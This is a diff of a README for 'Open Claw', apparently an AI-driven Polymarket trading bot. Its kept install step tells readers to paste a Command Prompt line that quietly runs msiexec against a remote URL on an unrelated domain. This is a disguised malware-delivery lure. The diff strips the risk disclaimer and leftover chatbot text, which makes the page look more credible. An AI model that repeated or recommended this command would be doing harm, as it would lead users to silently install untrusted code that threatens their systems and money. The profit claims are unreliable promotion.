@@ -43,17 +43,10 @@ Step 2: Execute the Command. Copy and paste the command below into Command Promp
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem HyperTrader
 ```
 
-Optional frontend:
-
-```bash
-cd dashboard
-npm install
-npm run dev
-```
 
 ---
 
-# 3. 🧠 Background
+# 🧠 Background
 
 Prediction markets like Polymarket allow users to trade probabilities of real-world events. Prices reflect **collective belief** and act as probabilistic forecasts.
 
@@ -67,7 +60,7 @@ Recent research shows AI agents can identify **hidden relationships and misprici
 
 ---
 
-# 4. ✨ Features
+# ✨ Features
 
 ### 🔍 Core Capabilities
 
@@ -89,7 +82,7 @@ Platforms already use similar logic to highlight profitable opportunities where 
 
 ---
 
-# 5. 👀 Preview
+# 👀 Preview
 
 ### AI Decision Engine
 
@@ -117,7 +110,7 @@ def analyze_market(question, price):
 
 ---
 
-# 6. ⚙️ Configuration
+# ⚙️ Configuration
 
 Create `.env`:
 
@@ -146,7 +139,7 @@ CONFIG = {
 
 ---
 
-# 7. 🧱 Tech Stack
+# 🧱 Tech Stack
 
 **Backend:**
 
@@ -174,7 +167,7 @@ Modern trading systems often use **event-driven architectures + real-time stream
 
 ---
 
-# 8. 🚀 Getting Started
+# 🚀 Getting Started
 
 ### Step 1 — Fetch markets
 
@@ -236,7 +229,7 @@ def run():
 
 ---
 
-# 9. 🐳 Docker
+# 🐳 Docker
 
 ### Dockerfile
 
@@ -258,17 +251,6 @@ docker build -t open-claw .
 docker run --env-file .env open-claw
 ```
 
----
-
-# ⚠️ Risk Disclaimer
-
-AI trading on prediction markets involves:
-
-* market inefficiencies
-* model errors
-* liquidity risks
-
-Even advanced AI systems with high win rates still rely on **proper risk management and execution discipline** ([polyquant.site][5])
 
 ---
 
@@ -278,17 +260,6 @@ Open Claw transforms prediction market trading into a **fully automated AI-drive
 
 * Scan → Analyze → Detect edge → Execute → Manage risk
 
----
 
-If you want, I can next:
 
-* design a **production-grade architecture (with queues, microservices, logs)**
-* add **multi-agent collaboration (research + execution agents)**
-* or build a **real arbitrage strategy across Polymarket + Kalshi**
-
-[1]: https://www.polyedgeai.com/?utm_source=chatgpt.com "PolyEdge AI | AI-Powered Polymarket Trading"
-[2]: https://arxiv.org/abs/2512.02436?utm_source=chatgpt.com "Semantic Trading: Agentic AI for Clustering and Relationship Discovery in Prediction Markets"
-[3]: https://polymarketai.io/?utm_source=chatgpt.com "PolymarketAI — AI Edge Detection for Polymarket"
-[4]: https://prolymarket.app/?utm_source=chatgpt.com "Prolymarket - Real-time Polymarket Intelligence"
-[5]: https://www.polyquant.site/?utm_source=chatgpt.com "Polymarket AI Quant Dashboard"
 
